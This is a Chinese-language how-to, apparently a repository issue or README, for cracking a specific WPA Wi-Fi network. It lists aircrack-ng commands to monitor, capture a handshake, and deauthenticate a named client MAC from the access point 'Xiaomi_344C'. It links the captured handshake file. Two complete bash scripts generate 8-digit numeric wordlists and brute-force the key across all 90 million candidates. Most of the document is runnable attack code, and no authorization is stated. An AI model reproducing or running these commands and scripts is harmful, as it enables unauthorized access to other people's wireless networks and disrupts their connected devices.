# 命令
```shell
# 查看可用网卡
airmon-ng 

# 启动监听
airmon-ng start wlan0

# 查看网卡名字
ifconfig

#扫描 
airodump-ng wlan0mon

#开始抓包
airodump-ng wlan0mon -c 1 --bssid 44:F7:70:28:D1:32 -w ./344c 

# 发送10次ACK攻击
aireplay-ng -0 10 -a 44:F7:70:28:D1:32 -c 58:B6:23:C0:47:98 wlan0mo

#字典去重
cat ./wpa-dictionary-master/common.txt | python3 ./wpa-dictionary-master/normalize.py > clean_common.txt

#暴力破解
aircrack-ng -w ./password_10000000_to_10999999.txt ./handshake-01.cap -b 44:F7:70:28:D1:32

#脚本破解
python3 test_passwords.py ./test_dict.txt ./handshake-01.cap
```

# 抓包文件

[1.log](https://github.com/user-attachments/files/20983910/1.log)

- 受上传限制，下载后更名为handshake-01.cap


# 生成8位纯数字密码脚本
```shell
#!/bin/bash

# 按范围生成8位纯数字密码的脚本

echo "=== 8位纯数字密码范围生成器 ==="

# 主函数
main() {
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
        echo "用法: $0 [选项]"
        echo "选项:"
        echo "  -s START    起始数字 (默认: 10000000)"
        echo "  -e END      结束数字 (默认: 19999999)"
        echo "  -o OUTPUT   输出文件名前缀 (默认: password)"
        echo "  -h, --help  显示帮助信息"
        echo ""
        echo "示例:"
        echo "  $0 -s 10000000 -e 19999999"
        echo "  $0 -s 20000000 -e 29999999 -o xiaomi"
        echo "  $0 -s 12345678 -e 12345688"
        exit 0
    fi
    
    # 默认参数
    start_num=10000000
    end_num=19999999
    output_prefix="password"
    
    # 解析命令行参数
    while [ $# -gt 0 ]; do
        case $1 in
            -s)
                start_num="$2"
                shift 2
                ;;
            -e)
                end_num="$2"
                shift 2
                ;;
            -o)
                output_prefix="$2"
                shift 2
                ;;
            *)
                echo "未知参数: $1"
                echo "使用 -h 查看帮助"
                exit 1
                ;;
        esac
    done
    
    # 验证参数
    if ! [[ "$start_num" =~ ^[0-9]+$ ]] || [ "$start_num" -lt 10000000 ] || [ "$start_num" -gt 99999999 ]; then
        echo "错误: 起始数字必须是8位数字 (10000000-99999999)"
        exit 1
    fi
    
    if ! [[ "$end_num" =~ ^[0-9]+$ ]] || [ "$end_num" -lt 10000000 ] || [ "$end_num" -gt 99999999 ]; then
        echo "错误: 结束数字必须是8位数字 (10000000-99999999)"
        exit 1
    fi
    
    if [ "$start_num" -gt "$end_num" ]; then
        echo "错误: 起始数字不能大于结束数字"
        exit 1
    fi
    
    # 计算范围大小
    range_size=$((end_num - start_num + 1))
    
    # 检查范围大小是否合理
    if [ $range_size -gt 10000000 ]; then
        echo "警告: 范围过大 ($range_size 个密码)，建议分批生成"
        echo "当前范围: $start_num 到 $end_num"
        read -p "是否继续? (y/N): " confirm
        if [[ ! $confirm =~ ^[Yy]$ ]]; then
            echo "已取消"
            exit 0
        fi
    fi
    
    # 生成文件名
    filename="${output_prefix}_${start_num}_to_${end_num}.txt"
    
    echo "起始数字: $start_num"
    echo "结束数字: $end_num"
    echo "密码数量: $range_size"
    echo "输出文件: $filename"
    echo ""
    
    # 检查磁盘空间
    estimated_size=$((range_size * 9))  # 每个密码8位+换行符
    available_space=$(df . | awk 'NR==2 {print $4}')
    if [ $estimated_size -gt $available_space ]; then
        echo "错误: 磁盘空间不足"
        echo "需要空间: ${estimated_size} 字节"
        echo "可用空间: ${available_space} 字节"
        exit 1
    fi
    
    echo "开始生成密码..."
    
    # 生成密码
    seq $start_num $end_num > "$filename"
    
    # 检查生成结果
    actual_count=$(wc -l < "$filename")
    file_size=$(wc -c < "$filename")
    
    echo ""
    echo "✅ 密码生成完成!"
    echo "📁 文件: $filename"
    echo "📊 实际生成: $actual_count 个密码"
    echo "💾 文件大小: $file_size 字节"
    echo ""
    echo "前10个密码预览:"
    head -10 "$filename"
    
    if [ $actual_count -gt 10 ]; then
        echo "..."
        echo "后10个密码预览:"
        tail -10 "$filename"
    fi
}

# 运行主函数
main "$@" 
```

# 自动跑任务脚本
```shell
#!/bin/bash

# 8位纯数字密码完整破解脚本
# 范围：10000000-99999999 (9000万个密码)

echo "=== 8位纯数字密码完整破解脚本 ==="
echo "开始时间: $(date)"
echo ""

# 创建报告文件
report_file="crack_report_$(date +%Y%m%d_%H%M%S).txt"
echo "8位纯数字密码破解报告" > "$report_file"
echo "开始时间: $(date)" >> "$report_file"
echo "目标网络: Xiaomi_344C (44:F7:70:28:D1:32)" >> "$report_file"
echo "========================================" >> "$report_file"

# 定义范围参数
start_range=10000000
end_range=99999999
batch_size=1000000  # 每批100万个密码

# 计算总批次数
total_batches=$(((end_range - start_range + 1) / batch_size))
current_batch=1

echo "总范围: $start_range 到 $end_range"
echo "每批大小: $batch_size 个密码"
echo "总批次数: $total_batches"
echo ""

# 主循环
for ((batch_start=start_range; batch_start<=end_range; batch_start+=batch_size)); do
    batch_end=$((batch_start + batch_size - 1))
    
    # 确保不超过最大范围
    if [ $batch_end -gt $end_range ]; then
        batch_end=$end_range
    fi
    
    echo "========================================"
    echo "批次 $current_batch/$total_batches"
    echo "范围: $batch_start 到 $batch_end"
    echo "开始时间: $(date)"
    echo ""
    
    # 生成密码文件
    echo "正在生成密码文件..."
    ./generate_password.sh -s $batch_start -e $batch_end -o "batch_${current_batch}"
    
    if [ $? -ne 0 ]; then
        echo "❌ 密码生成失败，跳过此批次"
        echo "批次 $current_batch: $batch_start-$batch_end - 生成失败" >> "$report_file"
        current_batch=$((current_batch + 1))
        continue
    fi
    
    password_file="batch_${current_batch}_${batch_start}_to_${batch_end}.txt"
    
    # 检查文件是否存在
    if [ ! -f "$password_file" ]; then
        echo "❌ 密码文件不存在: $password_file"
        echo "批次 $current_batch: $batch_start-$batch_end - 文件不存在" >> "$report_file"
        current_batch=$((current_batch + 1))
        continue
    fi
    
    # 开始破解
    echo "开始破解..."
    echo "使用字典: $password_file"
    echo ""
    
    # 运行aircrack-ng并捕获输出
    crack_output=$(aircrack-ng -w "$password_file" ./handshake-01.cap -b 44:F7:70:28:D1:32 2>&1)
    crack_result=$?
    
    # 检查是否找到密码
    if echo "$crack_output" | grep -q "KEY FOUND"; then
        password=$(echo "$crack_output" | grep "KEY FOUND" | awk '{print $4}')
        echo "🎉 密码找到了!"
        echo "密码: $password"
        echo "范围: $batch_start 到 $batch_end"
        echo ""
        
        # 记录到报告
        echo "✅ 成功找到密码!" >> "$report_file"
        echo "密码: $password" >> "$report_file"
        echo "范围: $batch_start 到 $batch_end" >> "$report_file"
        echo "批次: $current_batch" >> "$report_file"
        echo "结束时间: $(date)" >> "$report_file"
        
        # 删除密码文件
        rm -f "$password_file"
        echo "已删除密码文件: $password_file"
        
        echo "破解完成！密码已找到。"
        break
    else
        echo "❌ 在此范围内未找到密码"
        echo "范围: $batch_start 到 $batch_end"
        echo ""
        
        # 记录到报告
        echo "❌ 批次 $current_batch: $batch_start-$batch_end - 未找到密码" >> "$report_file"
    fi
    
    # 删除密码文件以节省空间
    rm -f "$password_file"
    echo "已删除密码文件: $password_file"
    echo ""
    
    # 显示进度
    progress=$((current_batch * 100 / total_batches))
    echo "进度: $progress% ($current_batch/$total_batches)"
    echo "已测试范围: $start_range 到 $batch_end"
    echo ""
    
    current_batch=$((current_batch + 1))
    
    # 每10批次显示一次详细进度
    if [ $((current_batch % 10)) -eq 0 ]; then
        echo "=== 详细进度报告 ==="
        echo "当前时间: $(date)"
        echo "已完成批次: $((current_batch - 1))"
        echo "剩余批次: $((total_batches - current_batch + 1))"
        echo "预计剩余时间: 约 $(( (total_batches - current_batch + 1) * 5 )) 分钟"
        echo ""
    fi
done

# 完成后的总结
echo "========================================"
echo "破解任务完成"
echo "结束时间: $(date)"
echo ""

# 检查是否找到密码
if grep -q "✅ 成功找到密码!" "$report_file"; then
    echo "🎉 破解成功！密码已找到。"
    echo "查看详细报告: $report_file"
else
    echo "❌ 所有8位纯数字密码都已测试完毕，未找到正确密码。"
    echo "测试范围: $start_range 到 $end_range"
    echo "总密码数: $((end_range - start_range + 1))"
    echo ""
    echo "建议:"
    echo "1. 检查握手包是否有效"
    echo "2. 尝试其他密码类型（字母+数字）"
    echo "3. 检查目标网络是否使用了非8位数字密码"
    
    # 记录最终结果到报告
    echo "" >> "$report_file"
    echo "========================================" >> "$report_file"
    echo "最终结果: 未找到密码" >> "$report_file"
    echo "测试范围: $start_range 到 $end_range" >> "$report_file"
    echo "总密码数: $((end_range - start_range + 1))" >> "$report_file"
    echo "结束时间: $(date)" >> "$report_file"
fi

echo ""
echo "详细报告已保存到: $report_file"
```

- 运行完整破解脚本
./test.sh
- 查看实时进度
- tail -f crack_report_*.txt
